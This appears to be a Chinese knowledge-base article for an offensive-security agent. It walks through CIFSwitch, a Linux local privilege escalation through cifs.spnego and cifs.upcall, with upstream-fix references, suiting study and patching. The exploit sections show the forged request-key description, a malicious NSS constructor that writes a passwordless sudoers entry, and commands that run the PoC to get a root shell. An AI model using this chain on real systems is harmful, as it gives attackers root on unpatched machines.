---
id: "general/01-kernel/04-cifswitch-nss-privesc"
title: "CIFSwitch：cifs.spnego 身份混淆 → root 权限 NSS 加载"
title_en: "CIFSwitch: cifs.spnego Identity Confusion to Root NSS Loading"
summary: >
  利用 cifs.spnego 缺少 vet_description 钩子，伪造 request-key description 诱导 cifs.upcall 以 root 权限进入攻击者 namespace，通过恶意 NSS 模块注入 sudoers 实现提权。
summary_en: >
  Exploits missing vet_description hook in cifs.spnego to forge request-key descriptions, luring cifs.upcall with root privilege into attacker's namespace, then injecting sudoers via malicious NSS module for privilege escalation.
board: "general"
category: "01-kernel"
signals:
  - "cifs.spnego"
  - "request-key"
  - "NSS module injection"
  - "vet_description missing"
  - "namespace abuse"
  - "cifs.upcall"
mcp_tools:
  - "kb_router"
  - "workspace_write_text"
keywords:
  - "QVD-2026-29453"
  - "cifs.upcall"
  - "NSS"
  - "request_key"
  - "user namespace"
  - "privilege escalation"
  - "sudoers injection"
  - "CIFSwitch"
difficulty: "intermediate"
tags:
  - "kernel-exploitation"
  - "NSS"
  - "namespace"
  - "LPE"
  - "cifs"
language: "zh-CN"
last_updated: "2026-06-25"
related_articles: []
---
# CIFSwitch：cifs.spnego 身份混淆 → root 权限 NSS 加载（QVD-2026-29453）

## 1. 前置条件

| 条件 | 说明 |
|------|------|
| `cifs-utils` | `cifs.upcall` 存在（>= 6.14 重点提及） |
| request-key 规则 | `/etc/request-key.conf` 或 `/etc/request-key.d/` 存在 `cifs.spnego` → `cifs.upcall` |
| 用户命名空间 | 非特权 user namespace + mount namespace 可用 |
| LSM 策略 | AppArmor / SELinux 未阻断 |

## 2. 受影响发行版

Linux Mint 21.3 / 22.3、CentOS Stream 9、Rocky Linux 9、Kali Linux 多版本、AlmaLinux 9.7、SLES 15 SP7 / 16。

## 3. 根因：缺少 vet_description 来源校验

Linux key type 可以实现 `.vet_description` 钩子验证 key description 是否可信。`cifs_spnego_key_type` **缺少该钩子**：

```c
// 攻击者可调用：
request_key("cifs.spnego", forged_description, "", KEY_SPEC_SESSION_KEYRING)
// 内核无法区分真正的 CIFS 内核模块请求 vs 本地用户伪造请求
```

## 4. 四层利用链

**第一层：伪造 cifs.spnego description**

```text
ver=0x2;host=example.com;ip4=127.0.0.1;sec=krb5;
uid=0x0;creduid=0x0;pid=<pid>;upcall_target=app;user=root
```

关键字段：`pid=<pid>` 指向攻击者控制 namespace 中的触发进程；`upcall_target=app` 诱导 `cifs.upcall` 进入 `switch_to_process_ns(arg->pid)`；`user=root` 触发 root 用户解析 → `getpwuid()` → NSS 路径。

**第二层：root 权限 cifs.upcall 进入攻击者 namespace**

`cifs.upcall` 以 root 运行，根据伪造的 `pid` 字段切换到攻击者控制的进程 namespace。

**第三层：NSS 加载恶意模块**

攻击者在 mount namespace 中绑定伪造的 `/etc/nsswitch.conf` 和 `fakelib`：
```
passwd: pwn files
```
root 进程调用 `getpwuid()` 时加载 `libnss_pwn.so.2` → constructor 执行。

**第四层：constructor 写入 sudoers 或创建 SUID shell**

```c
__attribute__((constructor))
static void pwn_constructor(void) {
    int fd = open("/etc/sudoers.d/cifs-upcall-poc-<uid>_<pid>",
                  O_WRONLY | O_CREAT | O_TRUNC, 0440);
    dprintf(fd, "%s ALL=(ALL:ALL) NOPASSWD: ALL\n", getenv("SUDOERS_USER"));
}
```

## 5. 攻击链路

```
本地低权限用户
  → 创建 user namespace + mount namespace
  → 准备伪造 /etc/nsswitch.conf（passwd: pwn files）
  → 准备恶意 libnss_pwn.so.2
  → bind mount 覆盖 NSS 配置与模块目录
  → 构造 forged cifs.spnego description
  → request_key("cifs.spnego", forged_description, ...)
  → /sbin/request-key 触发 cifs.upcall
  → cifs.upcall 以 root 权限进入攻击者 namespace
  → 降权前调用 getpwuid() → 加载 libnss_pwn.so.2
  → constructor 写入 /etc/sudoers.d/ 或创建 SUID shell
  → sudo -n /bin/bash -p → root shell
```

## 6. PoC 关键路径

```python
WORKDIR = Path("/tmp") / ("cifs-upcall-sudoers-poc-%s" % RUN_TOKEN)
FAKELIB_DIR = WORKDIR / "fakelib"
FAKE_NSSWITCH = WORKDIR / "nsswitch.conf"
SUDOERS_PATH = "/etc/sudoers.d/cifs-upcall-poc-%s_%s" % (uid, pid)
```

### 恶意 NSS 模块

```c
__attribute__((constructor))
static void pwn_constructor(void) {
    open(SUDOERS_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0440);
    dprintf(sudoers_fd, "%s ALL=(ALL:ALL) NOPASSWD: ALL\n", SUDOERS_USER);
}
```

### 伪造 description

```text
ver=0x2;host=example.com;ip4=127.0.0.1;sec=krb5;
uid=0x0;creduid=0x0;pid=<pid>;upcall_target=app;user=root
```

## 7. 复现

```bash
# 前置检查
command -v cifs.upcall && cifs.upcall -V 2>/dev/null
grep -R "cifs.spnego" /etc/request-key.conf /etc/request-key.d 2>/dev/null
unshare -Ur -m true

# 运行 PoC
cd "QVD-2026-29453 CIFSwitch"
python3 exploit/exp.py
```

### 清理

```bash
sudo rm -f /etc/sudoers.d/cifs-upcall-poc-* \
  /tmp/cifs_upcall_sudoers_evidence_*.txt \
  /var/tmp/cifs_upcall_rootsh_*
rm -rf /tmp/cifs-upcall-sudoers-poc-*/
```

## 8. 为什么这条链稳定

| 特性 | 说明 |
|------|------|
| 不依赖内核地址 | 没有 KASLR / kernel ROP 需求 |
| 不依赖内存破坏 | 不是 UAF / OOB / race |
| 利用 root helper | 借系统合法的 `cifs.upcall` 提权 |
| 关键路径可预检 | PoC 会检查 gcc / sudo / unshare / request-key 规则 |

## Evidence

记录: user/mount namespace 创建结果、bind mount 路径、cifs.upcall 日志、sudoers 写入结果、root shell 输出

## MCP 工具映射

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| 知识检索 | `kb_router` | 按 CIFSwitch / cifs.upcall / NSS 信号搜索 |
| 写分析笔记 | `workspace_write_text` | 记录提权过程 |

## 参考资料

| 来源 | 链接 |
|------|------|
| 漏洞披露原文 | https://heyitsas.im/posts/cifswitch/ |
| 作者 PoC | https://github.com/manizada/CIFSwitch |
| 上游修复 | https://github.com/torvalds/linux/commit/3da1fdf4efbc490041eb4f836bf596201203f8f2 |
| 腾讯云通告 | https://cloud.tencent.com/developer/article/2676151 |
| poc-lab 源 | https://github.com/Unclecheng-li/poc-lab/tree/main/QVD-2026-29453%20CIFSwitch |
